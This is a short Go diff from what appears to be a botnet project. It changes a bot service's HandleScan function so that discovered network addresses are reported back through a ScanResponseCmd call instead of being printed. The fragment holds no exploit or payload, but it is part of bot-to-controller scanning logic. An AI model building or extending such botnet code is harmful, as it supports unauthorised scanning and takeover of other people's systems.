@@ -3,7 +3,6 @@ package tcp
 import (
 	"bytes"
 	"encoding/gob"
-	"fmt"
 	"log"
 
 	"github.com/rodzzlessa24/botnet"
@@ -29,8 +28,12 @@ func (b *BotService) HandleScan(payload []byte) {
 
 	var res []string
 	for addr := range resCh {
-		fmt.Println("addr found", addr)
 		res = append(res, addr)
+	}
+
+	if err := b.ScanResponseCmd(res); err != nil {
+		log.Println("responding to scan", err)
+		return
 	}
 }
 
